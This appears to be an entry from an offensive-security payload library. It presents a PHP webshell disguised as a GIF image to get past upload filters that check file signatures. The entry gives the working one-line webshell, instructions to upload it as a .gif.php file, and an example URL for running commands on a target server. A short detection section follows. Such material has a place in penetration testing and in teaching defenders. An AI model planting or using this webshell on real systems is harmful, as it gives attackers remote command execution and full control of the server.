---
id: 77a6625f-d513-4a09-8951-ad851cce0911
type: code
language: php
verified: true
created_at: '2019-10-09T21:29:38.121067+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
tags:
  - php
  - webshell
  - bypass
  - file-upload
  - rce
  - payload
platforms:
  - Web
validated: true
---

# GIF-PHP-Webshell-Bypass

## Code

```php
GIF8
<?php system($_REQUEST['cmd']); ?>
```

## Description

This payload combines a GIF file header (GIF8) with a PHP webshell to bypass file upload restrictions that check magic bytes for image validation. The leading GIF bytes make the file appear as a valid GIF image, but PHP ignores them during parsing and executes the embedded system() command for RCE when accessed.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_REQUEST['cmd'] | Command to execute on the server | `whoami` or `ls -la` |

## Usage

Use this in file upload forms that validate signatures but not full content. Save as a .gif.php file and upload. Access via http://target/uploads/image.gif.php?cmd=uname -a to execute commands. Ideal for exploiting weak PHP upload handlers in web apps.

## Detection

- Upload scanners checking for mismatched MIME types vs. content (e.g., GIF header followed by PHP code).
- Server logs for PHP execution of files with image extensions.
- Static analysis of uploaded files for embedded executable code.
- Behavioral monitoring for command execution from web-accessible uploads.

## Related

- [[procedures/Bypass-Insecure-PHP-Upload-Form-File-Restrictions]]
- [[tools/File-Upload-Testing-Tools]] (if applicable, or general web proxies)
